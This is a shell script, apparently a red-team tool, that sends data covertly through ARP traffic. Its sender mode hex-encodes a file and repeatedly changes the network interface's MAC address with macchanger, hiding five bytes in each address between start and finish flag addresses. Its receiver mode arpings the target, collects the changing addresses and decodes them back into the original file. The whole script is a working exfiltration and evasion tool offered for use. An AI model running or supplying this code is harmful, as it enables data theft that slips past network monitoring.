 #!/bin/sh
echo
echo "NativePayload_ARP.sh , Published by Damon Mohammadbagher 2017-2018" 
echo "Injecting/Downloading/Uploading DATA via ARP Traffic"
echo "help syntax: ./NativePayload_ARP.sh help"
echo
# ./NativePayload_ARP.sh -s mytext.txt eth0 delay 3
if [ $1 == "-s" ]
then
		echo "[!] Changing MAC Address via macchanger Tool"
		counter=0 
		Defdelay=3
		if [ $4 == "delay" ] 
			then
			Defdelay=$5
			elif [ $4 == null ]
			then
			Defdelay=3
		fi
	# start flag
	echo "[>] Changing MAC Address to start ... (Delay 5 sec)"
	sudo ifconfig $3 down; sudo macchanger -m  00:ff:ff:ff:ff:ff $3 | grep New; sudo ifconfig $3 up; sleep 5;
	echo

	for ops in `xxd -p -c 5 $2 | sed 's/../&:/g' `; 
	do
		Exfil=$ops
		Exfil=`echo $Exfil `		
		if (( `echo ${#Exfil}` == 15 ))
		then 
		tput setaf 7;	
		echo "[!] your text is:" `echo 00:"${Exfil::-1}" | xxd -r -p `
		tput setaf 6;	
		echo "[!] your MAC Address is:" 00:"${Exfil::-1}"
		#echo "sudo ifconfig eth0 down; sudo macchanger -m " 00:"${Exfil::-1}" " eth0; sudo ifconfig eth0 up; sleep x;"
		tput setaf 9;
		echo "[>] [$counter] MAC Changing Done , Delay is :" $Defdelay "(sec)"	
		sudo ifconfig $3 down;sudo macchanger -m  00:"${Exfil::-1}" $3 | grep New; sudo ifconfig $3 up; sleep $Defdelay;
		((counter++))
		echo ------------------
		fi		
	done
		# finish flag
		echo
		echo "[>] Changing MAC Address to (finish flag)"
		sudo ifconfig $3 down; sudo macchanger -m  00:ff:00:ff:00:ff $3 | grep New; sudo ifconfig $3 up; sleep $Defdelay;
		echo

fi

#./NativePayload_ARP.sh -a eth0 192.168.56.101 3

if [ $1 == "-a" ]
then
	# this ARPData.txt file tested by Arping version: "arping utility, iputils-s20161105" and "kali linux 2018.2"
	# some arping switches changed by old/new versions
	arping -I $2 $3 -w 0 -b > ARPData.txt &
	init=0
	echo "[!] Scanning Target [$3] via Arping by delay ($4)."
	while true; do
	String=`cat ARPData.txt | grep -e 00:ff:00:ff:00:ff -e 00:FF:00:FF:00:FF`
	#printf '\u2591\n'
	#printf '\u2592\n'
	#printf '\u2593\n'
	if (( init == 0 ))
	then
        Startflag=`cat ARPData.txt | grep -e 00:ff:ff:ff:ff:ff -e 00:FF:FF:FF:FF:FF`
		if (( `echo ${#Startflag}` !=0 ))
		then
		tput setaf 6;	
		echo "[!] Start flag MAC Address Detected :" 00:ff:ff:ff:ff:ff
		((init++))
		fi	
	fi				

        	if (( `echo ${#String}` !=0 ))
		then
		killall arping
		tput setaf 6;	
		echo "[!] Finish flag MAC Address Detected :" 00:ff:00:ff:00:ff
		break
		fi
	sleep 1
	done
	###
	LastMacAddress=""
	FinalPayload=""
	# this ARPData.txt file tested by Arping version: "arping utility, iputils-s20161105"
	# some arping switches changed by old/new versions
	# ARPData.txt , Dumping MAC : xx:xx:xx:xx:xx:xx
	# Unicast reply from 192.168.56.101 [xx:xx:xx:xx:xx:xx]  0.864ms
	# Unicast reply from 192.168.56.101 [00:FF:FF:FF:FF:FF]  0.864ms
	# Unicast reply from 192.168.56.101 [00:74:68:69:73:20]  1.012ms
	for MacAddresses in `cat ARPData.txt | grep Unicast | awk {'print $5'} | sed 's/\[/ /g' | sed 's/\]/ /g'`; 
	do
		# echo $MacAddresses
		# echo $LastMacAddress
		# echo
		if [[ `echo $MacAddresses` != `echo $LastMacAddress` ]]
		then
			FinalPayload+=`echo $MacAddresses`:
			#echo "Debug"
		fi
	LastMacAddress=$MacAddresses
	done
	tput setaf 7;	
	echo
	echo "[!] Your Injected Bytes via Mac Addresses: "
	echo $FinalPayload
	echo
	tput setaf 6;	
	echo "[!] Your Data : "
	echo
	echo "${FinalPayload:17:-17}" | xxd -r -p
	echo
	echo
	###
#	t=`cat ARPData.txt | grep Unicast | awk {'print $5'} | awk '!a[$0]++' | sed 's/\[/ /g' | sed 's/\]/ /g'`
#	tput setaf 7;	
#	echo
#	echo "[!] your Injected Bytes via Mac Addresses: "
#	echo `echo $t`
#	echo
#	tput setaf 6;	
#	echo "[!] your Data : "
#	echo
#	echo "${t:17:-17}" | xxd -r -p
#	echo
#	echo
fi
